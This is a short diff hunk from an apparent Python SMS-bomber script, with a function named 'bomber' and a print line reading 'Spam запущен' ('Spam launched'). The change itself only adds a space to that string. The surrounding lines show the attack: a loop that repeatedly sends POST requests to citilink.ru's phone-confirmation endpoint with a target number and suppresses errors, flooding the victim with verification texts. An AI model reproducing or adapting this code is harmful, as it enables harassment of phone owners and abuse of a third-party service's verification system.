@@ -33,7 +33,7 @@ def bomber(nomer, krug, k):
 	#960+270+55-51
 	#960+270-55-51
 	#+7 (960) 270-55-51
-	print('Spam запущен')
+	print('Spam запущен ')
 	for spama in range(int(krug)):		
 		try:requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers, timeout=5.05)
 		except:pass
